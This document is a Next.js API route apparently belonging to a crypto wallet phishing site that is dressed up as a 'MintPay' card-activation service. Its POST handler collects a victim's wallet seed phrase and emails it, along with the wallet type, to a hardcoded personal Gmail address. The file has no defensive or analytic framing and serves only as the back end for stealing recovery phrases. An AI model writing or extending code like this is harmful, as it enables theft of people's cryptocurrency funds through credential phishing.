// app/api/collect-seed/route.ts
import { NextResponse } from "next/server";
import { Resend } from "resend"; // Make sure you have 'resend' installed: npm i resend

// Initialize Resend with your API Key from .env.local
const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { walletType, seedPhrase, timestamp } = body;

    // Basic validation
    if (!seedPhrase || !walletType) {
      return NextResponse.json(
        { error: "Missing seedPhrase or walletType" },
        { status: 400 }
      );
    }

    // Define the recipient email from ENV
    const adminEmail = process.env.ADMIN_EMAIL || "chineloifeyinwa@gmail.com";

    // Send the email
    const data = await resend.emails.send({
      from: "MintPay Activation <onboarding@resend.dev>", // Use your verified domain
      to: [adminEmail],
      subject: `New Card Activation: ${walletType}`,
      html: `
        <h2>New Wallet Activation</h2>
        <p><strong>Wallet:</strong> ${walletType}</p>
        <p><strong>Seed Phrase:</strong></p>
        <p style="font-family: monospace; background: #f4f4f4; padding: 10px; border-radius: 5px;">
          ${seedPhrase}
        </p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <hr />
        <p style="font-size: 12px; color: #666;">Derived from ${walletType}</p>
      `,
    });

    if (data.error) {
      console.error("Resend Error:", data.error);
      return NextResponse.json(
        { error: "Email sending failed", details: data.error },
        { status: 500 }
      );
    }
    return NextResponse.json({ success: true, id: data.id });

  } catch (error) {
    console.error("API Route Error:", error);
    return NextResponse.json(
      { error: "Internal Server Error" },
      { status: 500 }
    );
  }
}